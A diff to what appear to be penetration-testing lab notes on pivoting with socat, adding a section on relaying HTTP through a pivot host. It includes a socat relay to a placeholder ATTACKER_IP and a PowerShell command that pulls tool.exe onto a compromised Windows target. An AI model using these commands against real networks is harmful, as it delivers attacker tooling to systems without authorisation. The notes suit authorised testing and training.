@@ -74,6 +74,23 @@ This makes a connection between our listening port `8001` on the attacking machi
 
 This would create a link between port `8000` on our attacking machine, and port `80` on the intended target (`172.16.0.10`), meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target: `172.16.0.10:80`!
 
+### Socat Windows Relay for File Transfers
+
+When a target Windows machine cannot reach your attack box directly but can reach a pivot host, use socat on the pivot to relay HTTP traffic:
+
+```bash
+# On pivot host — relay port 8000 back to attacker's HTTP server
+./socatx64.bin TCP-LISTEN:8000,fork,reuseaddr TCP:ATTACKER_IP:8000
+```
+
+**Important:** Use the uppercase `TCP-LISTEN` and `TCP` syntax with `fork,reuseaddr` — the lowercase `tcp-l` shorthand without fork will only handle one connection.
+
+Then from the Windows target:
+
+```powershell
+invoke-webrequest -usebasicparsing -uri http://PIVOT_IP:8000/tool.exe -o tool.exe
+```
+
 ### Socat Forward Port off Printer or non ssh enabled device
 
 * Have a compromised device that is running `cupsd` port 631, however its listening only on the loopback and the printer does not have ssh.
